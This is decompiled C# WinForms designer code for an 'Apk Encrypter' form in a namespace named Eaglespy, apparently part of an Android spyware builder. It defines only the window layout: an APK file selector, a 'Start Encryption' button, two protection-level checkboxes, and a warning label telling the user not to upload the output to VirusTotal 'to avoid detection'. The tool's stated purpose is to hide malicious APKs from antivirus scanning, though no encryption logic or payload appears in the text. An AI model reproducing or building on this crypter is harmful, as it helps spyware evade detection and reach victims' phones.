namespace Eaglespy
{
	// Token: 0x020000E6 RID: 230
	public partial class ApkDexEncrypter : global::System.Windows.Forms.Form
	{
		// Token: 0x06000B8D RID: 2957 RVA: 0x000074C9 File Offset: 0x000056C9
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000B8E RID: 2958 RVA: 0x000FBE7C File Offset: 0x000FA07C
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			this.guna2BorderlessForm1 = new global::Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.label8 = new global::System.Windows.Forms.Label();
			this.logtext = new global::DrakeUI.Framework.DrakeUIRichTextBox();
			this.Encryptbutton = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.drakeUIButtonIcon1 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.CheckBox1 = new global::DrakeUI.Framework.DrakeUICheckBox();
			this.CheckBox2 = new global::DrakeUI.Framework.DrakeUICheckBox();
			this.ApkFilePath = new global::DrakeUI.Framework.DrakeUITextBox();
			this.guna2ControlBox1 = new global::Guna.UI2.WinForms.Guna2ControlBox();
			this.drakeUIAvatar2 = new global::DrakeUI.Framework.DrakeUIAvatar();
			this.drakeUIAvatar3 = new global::DrakeUI.Framework.DrakeUIAvatar();
			this.pictureBox1 = new global::System.Windows.Forms.PictureBox();
			this.label1 = new global::System.Windows.Forms.Label();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			base.SuspendLayout();
			this.guna2BorderlessForm1.BorderRadius = 15;
			this.guna2BorderlessForm1.ContainerControl = this;
			this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			this.guna2BorderlessForm1.ShadowColor = global::System.Drawing.Color.Blue;
			this.guna2BorderlessForm1.TransparentWhileDrag = true;
			this.label8.AutoSize = true;
			this.label8.BackColor = global::System.Drawing.Color.Transparent;
			this.label8.Font = new global::System.Drawing.Font("Arial Rounded MT Bold", 18f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label8.ForeColor = global::System.Drawing.Color.White;
			this.label8.Location = new global::System.Drawing.Point(120, 23);
			this.label8.Name = "label8";
			this.label8.Size = new global::System.Drawing.Size(180, 28);
			this.label8.TabIndex = 210;
			this.label8.Text = "Apk Encrypter";
			this.logtext.AutoScroll = true;
			this.logtext.AutoWordSelection = true;
			this.logtext.BackColor = global::System.Drawing.Color.Transparent;
			this.logtext.FillColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.logtext.Font = new global::System.Drawing.Font("Segoe UI", 9.75f, global::System.Drawing.FontStyle.Italic, global::System.Drawing.GraphicsUnit.Point, 0);
			this.logtext.ForeColor = global::System.Drawing.Color.Lime;
			this.logtext.Location = new global::System.Drawing.Point(19, 149);
			this.logtext.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
			this.logtext.Name = "logtext";
			this.logtext.Padding = new global::System.Windows.Forms.Padding(2);
			this.logtext.RectColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.logtext.Size = new global::System.Drawing.Size(424, 167);
			this.logtext.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.logtext.TabIndex = 211;
			this.logtext.TextAlignment = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.Encryptbutton.BackColor = global::System.Drawing.Color.Transparent;
			this.Encryptbutton.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.Encryptbutton.FillColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.Encryptbutton.FillDisableColor = global::System.Drawing.Color.Empty;
			this.Encryptbutton.FillHoverColor = global::System.Drawing.Color.Empty;
			this.Encryptbutton.FillPressColor = global::System.Drawing.Color.Empty;
			this.Encryptbutton.FillSelectedColor = global::System.Drawing.Color.Empty;
			this.Encryptbutton.Font = new global::System.Drawing.Font("Candara", 12f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.Encryptbutton.ForeColor = global::System.Drawing.Color.Lime;
			this.Encryptbutton.ForeDisableColor = global::System.Drawing.Color.Empty;
			this.Encryptbutton.ForePressColor = global::System.Drawing.Color.Aqua;
			this.Encryptbutton.ForeSelectedColor = global::System.Drawing.Color.MediumSpringGreen;
			this.Encryptbutton.Location = new global::System.Drawing.Point(125, 334);
			this.Encryptbutton.Name = "Encryptbutton";
			this.Encryptbutton.RectColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.Encryptbutton.RectDisableColor = global::System.Drawing.Color.Empty;
			this.Encryptbutton.RectHoverColor = global::System.Drawing.Color.Empty;
			this.Encryptbutton.RectPressColor = global::System.Drawing.Color.Empty;
			this.Encryptbutton.RectSelectedColor = global::System.Drawing.Color.Empty;
			this.Encryptbutton.RectSides = global::System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
			this.Encryptbutton.Size = new global::System.Drawing.Size(196, 32);
			this.Encryptbutton.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.Encryptbutton.StyleCustomMode = true;
			this.Encryptbutton.Symbol = 61528;
			this.Encryptbutton.TabIndex = 213;
			this.Encryptbutton.Text = "Start Encryption";
			this.Encryptbutton.TipsColor = global::System.Drawing.Color.FromArgb(0, 0, 192);
			this.Encryptbutton.Click += new global::System.EventHandler(this.Encryptbutton_Click);
			this.drakeUIButtonIcon1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.drakeUIButtonIcon1.FillColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon1.FillHoverColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon1.FillPressColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.drakeUIButtonIcon1.FillSelectedColor = global::System.Drawing.Color.White;
			this.drakeUIButtonIcon1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.drakeUIButtonIcon1.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.drakeUIButtonIcon1.Location = new global::System.Drawing.Point(403, 104);
			this.drakeUIButtonIcon1.Name = "drakeUIButtonIcon1";
			this.drakeUIButtonIcon1.RectColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.drakeUIButtonIcon1.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.drakeUIButtonIcon1.RectHoverColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.drakeUIButtonIcon1.RectPressColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.drakeUIButtonIcon1.RectSelectedColor = global::System.Drawing.Color.White;
			this.drakeUIButtonIcon1.Size = new global::System.Drawing.Size(40, 27);
			this.drakeUIButtonIcon1.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.drakeUIButtonIcon1.Symbol = 61564;
			this.drakeUIButtonIcon1.TabIndex = 214;
			this.drakeUIButtonIcon1.Click += new global::System.EventHandler(this.drakeUIButtonIcon1_Click);
			this.CheckBox1.CheckBoxColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.CheckBox1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.CheckBox1.Font = new global::System.Drawing.Font("Segoe UI Semibold", 9.75f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.CheckBox1.ForeColor = global::System.Drawing.Color.White;
			this.CheckBox1.Location = new global::System.Drawing.Point(138, 398);
			this.CheckBox1.Name = "CheckBox1";
			this.CheckBox1.Padding = new global::System.Windows.Forms.Padding(22, 0, 0, 0);
			this.CheckBox1.Size = new global::System.Drawing.Size(137, 29);
			this.CheckBox1.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.CheckBox1.TabIndex = 216;
			this.CheckBox1.Text = "Protection Level 1";
			this.CheckBox1.ValueChanged += new global::DrakeUI.Framework.DrakeUICheckBox.OnValueChanged(this.CheckBox1_ValueChanged);
			this.CheckBox2.CheckBoxColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.CheckBox2.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.CheckBox2.Font = new global::System.Drawing.Font("Segoe UI Semibold", 9.75f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.CheckBox2.ForeColor = global::System.Drawing.Color.White;
			this.CheckBox2.Location = new global::System.Drawing.Point(138, 433);
			this.CheckBox2.Name = "CheckBox2";
			this.CheckBox2.Padding = new global::System.Windows.Forms.Padding(22, 0, 0, 0);
			this.CheckBox2.Size = new global::System.Drawing.Size(137, 29);
			this.CheckBox2.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.CheckBox2.TabIndex = 217;
			this.CheckBox2.Text = "Protection Level 2";
			this.CheckBox2.ValueChanged += new global::DrakeUI.Framework.DrakeUICheckBox.OnValueChanged(this.CheckBox2_ValueChanged);
			this.ApkFilePath.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.ApkFilePath.FillColor = global::System.Drawing.Color.FromArgb(0, 0, 64);
			this.ApkFilePath.Font = new global::System.Drawing.Font("Segoe UI Semibold", 9.75f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.ApkFilePath.ForeColor = global::System.Drawing.Color.White;
			this.ApkFilePath.Location = new global::System.Drawing.Point(19, 104);
			this.ApkFilePath.Margin = new global::System.Windows.Forms.Padding(4, 5, 4, 5);
			this.ApkFilePath.Maximum = 2147483647.0;
			this.ApkFilePath.Minimum = -2147483648.0;
			this.ApkFilePath.Name = "ApkFilePath";
			this.ApkFilePath.Padding = new global::System.Windows.Forms.Padding(5);
			this.ApkFilePath.RectColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.ApkFilePath.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.ApkFilePath.Size = new global::System.Drawing.Size(370, 25);
			this.ApkFilePath.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.ApkFilePath.TabIndex = 219;
			this.ApkFilePath.Watermark = "Select Apk";
			this.guna2ControlBox1.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox1.BackColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox1.BorderColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.guna2ControlBox1.FillColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.guna2ControlBox1.ForeColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.guna2ControlBox1.IconColor = global::System.Drawing.Color.Red;
			this.guna2ControlBox1.Location = new global::System.Drawing.Point(419, 1);
			this.guna2ControlBox1.Name = "guna2ControlBox1";
			this.guna2ControlBox1.PressedColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.guna2ControlBox1.Size = new global::System.Drawing.Size(45, 29);
			this.guna2ControlBox1.TabIndex = 220;
			this.drakeUIAvatar2.FillColor = global::System.Drawing.Color.Transparent;
			this.drakeUIAvatar2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.drakeUIAvatar2.ForeColor = global::System.Drawing.Color.Maroon;
			this.drakeUIAvatar2.Location = new global::System.Drawing.Point(284, 405);
			this.drakeUIAvatar2.Name = "drakeUIAvatar2";
			this.drakeUIAvatar2.Size = new global::System.Drawing.Size(20, 17);
			this.drakeUIAvatar2.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.drakeUIAvatar2.Symbol = 61452;
			this.drakeUIAvatar2.SymbolSize = 20;
			this.drakeUIAvatar2.TabIndex = 222;
			this.drakeUIAvatar2.Text = "drakeUIAvatar2";
			this.drakeUIAvatar3.FillColor = global::System.Drawing.Color.Transparent;
			this.drakeUIAvatar3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.drakeUIAvatar3.ForeColor = global::System.Drawing.Color.Maroon;
			this.drakeUIAvatar3.Location = new global::System.Drawing.Point(283, 439);
			this.drakeUIAvatar3.Name = "drakeUIAvatar3";
			this.drakeUIAvatar3.Size = new global::System.Drawing.Size(20, 17);
			this.drakeUIAvatar3.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.drakeUIAvatar3.Symbol = 61452;
			this.drakeUIAvatar3.SymbolSize = 20;
			this.drakeUIAvatar3.TabIndex = 223;
			this.drakeUIAvatar3.Text = "drakeUIAvatar3";
			this.pictureBox1.Image = global::Eagle_Spy_Applications.shield_6643256;
			this.pictureBox1.Location = new global::System.Drawing.Point(50, 15);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new global::System.Drawing.Size(50, 50);
			this.pictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.pictureBox1.TabIndex = 224;
			this.pictureBox1.TabStop = false;
			this.label1.AutoSize = true;
			this.label1.Font = new global::System.Drawing.Font("Segoe UI", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label1.ForeColor = global::System.Drawing.Color.Red;
			this.label1.Location = new global::System.Drawing.Point(80, 514);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(309, 13);
			this.label1.TabIndex = 225;
			this.label1.Text = "Warning : Do not upload it to virustotal to avoid detection";
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.BackgroundImageLayout = global::System.Windows.Forms.ImageLayout.Stretch;
			base.ClientSize = new global::System.Drawing.Size(465, 536);
			base.Controls.Add(this.label1);
			base.Controls.Add(this.pictureBox1);
			base.Controls.Add(this.drakeUIAvatar3);
			base.Controls.Add(this.drakeUIAvatar2);
			base.Controls.Add(this.guna2ControlBox1);
			base.Controls.Add(this.ApkFilePath);
			base.Controls.Add(this.CheckBox2);
			base.Controls.Add(this.CheckBox1);
			base.Controls.Add(this.drakeUIButtonIcon1);
			base.Controls.Add(this.Encryptbutton);
			base.Controls.Add(this.logtext);
			base.Controls.Add(this.label8);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Name = "ApkDexEncrypter";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "ApkDexEncrypter";
			base.TopMost = true;
			base.FormClosing += new global::System.Windows.Forms.FormClosingEventHandler(this.ApkDexEncrypter_FormClosing);
			base.Load += new global::System.EventHandler(this.ApkDexEncrypter_Load);
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000EC2 RID: 3778
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000EC3 RID: 3779
		private global::Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;

		// Token: 0x04000EC4 RID: 3780
		private global::System.Windows.Forms.Label label8;

		// Token: 0x04000EC5 RID: 3781
		private global::DrakeUI.Framework.DrakeUIRichTextBox logtext;

		// Token: 0x04000EC6 RID: 3782
		private global::DrakeUI.Framework.DrakeUIButtonIcon Encryptbutton;

		// Token: 0x04000EC7 RID: 3783
		private global::DrakeUI.Framework.DrakeUIButtonIcon drakeUIButtonIcon1;

		// Token: 0x04000EC8 RID: 3784
		private global::DrakeUI.Framework.DrakeUICheckBox CheckBox2;

		// Token: 0x04000EC9 RID: 3785
		private global::DrakeUI.Framework.DrakeUICheckBox CheckBox1;

		// Token: 0x04000ECA RID: 3786
		private global::DrakeUI.Framework.DrakeUITextBox ApkFilePath;

		// Token: 0x04000ECB RID: 3787
		private global::Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox1;

		// Token: 0x04000ECC RID: 3788
		private global::DrakeUI.Framework.DrakeUIAvatar drakeUIAvatar3;

		// Token: 0x04000ECD RID: 3789
		private global::DrakeUI.Framework.DrakeUIAvatar drakeUIAvatar2;

		// Token: 0x04000ECE RID: 3790
		private global::System.Windows.Forms.PictureBox pictureBox1;

		// Token: 0x04000ECF RID: 3791
		private global::System.Windows.Forms.Label label1;
	}
}
